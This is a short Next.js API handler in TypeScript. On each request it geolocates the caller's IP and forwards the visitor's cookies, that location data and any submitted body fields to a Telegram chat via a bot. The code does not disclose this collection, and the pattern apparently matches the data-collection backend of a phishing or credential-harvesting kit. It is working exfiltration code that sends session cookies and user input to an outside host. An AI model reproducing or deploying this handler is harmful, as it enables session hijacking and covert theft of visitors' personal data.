import type { NextApiRequest, NextApiResponse } from "next";
import TelegramBot from "node-telegram-bot-api";
import axios from "axios";
import requestIp from "request-ip";

type Data = {
  status: string;
};

const handler = async (req: NextApiRequest, res: NextApiResponse<Data>) => {
  const { data: ip } = await axios
    .get(`http://ip-api.com/json/${requestIp.getClientIp(req) || ""}`)
    .then((res) => res)
    .catch(() => ({ data: { error: "Error fetching info from ip-api" } }));

  const bot = new TelegramBot(process.env.TELEGRAM_TOKEN!, { polling: false });
  await bot.sendMessage(
    process.env.TELEGRAM_CHAT_ID!,
    `${req.body.title}:\n\n${JSON.stringify(
      { cookies: req.cookies, ip, ...req.body.notification },
      null,
      2
    )}`
  );
  res.status(200).json({ status: "success" });
};

export default handler;
